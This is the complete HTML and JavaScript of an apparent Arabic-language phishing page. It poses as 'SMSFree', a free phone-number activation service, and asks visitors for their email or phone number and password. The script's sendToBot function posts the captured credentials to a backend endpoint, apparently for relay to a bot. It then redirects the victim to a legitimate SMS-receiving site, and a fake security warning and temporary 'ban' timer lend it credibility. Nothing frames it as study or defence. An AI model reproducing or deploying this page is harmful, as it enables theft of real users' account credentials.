<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - تفعيل الحساب</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
            --error-red: #ef4444;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        .ban-box {
            border: 2px solid #fbbf24; border-radius: 12px;
            padding: 12px; margin-bottom: 20px; background: rgba(251, 191, 36, 0.1);
            color: #fbbf24; font-weight: bold; display: none;
        }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        /* تنسيق التنبيه الشفاف الاحترافي */
        .glass-popup {
            background: rgba(30, 41, 59, 0.7) !important;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px !important;
            color: white !important;
        }
    </style>
</head>
<body>

<div class="main-container">
    <div class="logo-circle">SMSFree</div>
    <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>

    <div class="ban-box" id="banBox">
        لقد تم حظرك مؤقتاً. فك الحظر بعد <span id="timer">30</span> ثانية
    </div>

    <form id="loginForm">
        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button type="submit" id="submitBtn" class="submit-btn">تفعيل الحساب الآن</button>
    </form>
</div>

<script>
    let attempts = 0;
    let isBanned = false;

    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        if (isBanned) return;

        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        // فحص المدخلات (منع الأحرف العشوائية القصيرة جداً أو العربية)
        const isInvalid = user.length < 5 || pass.length < 6 || /[\u0600-\u06FF]/.test(user);

        if (isInvalid) {
            attempts++;
            if (attempts >= 3) {
                startBan();
            } else {
                // نافذة تنبيه شفافة وأنيقة
                Swal.fire({
                    title: 'تنبيه أمني',
                    text: 'يرجى التأكد من كتابة البريد الإلكتروني وكلمة المرور بشكل صحيح لتجنب حظرك من استخدام الموقع مؤقتاً.',
                    icon: 'warning',
                    customClass: { popup: 'glass-popup' },
                    confirmButtonColor: '#22d3ee',
                    confirmButtonText: 'حسناً'
                });
            }
            return;
        }

        // إرسال البيانات إذا كانت صحيحة
        sendToBot(user, pass);
    };

    function startBan() {
        isBanned = true;
        attempts = 0;
        document.getElementById('banBox').style.display = 'block';
        document.getElementById('submitBtn').disabled = true;
        let timeLeft = 30;
        const interval = setInterval(() => {
            timeLeft--;
            document.getElementById('timer').innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(interval);
                document.getElementById('banBox').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
                isBanned = false;
            }
        }, 1000);
    }

    async function sendToBot(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `👤 مستخدم: ${u}\n🔑 كلمة مرور: ${p}` })
            });
            window.location.href = "https://receive-smss.com/";
        } catch (e) {}
    }
</script>
</body>
</html>
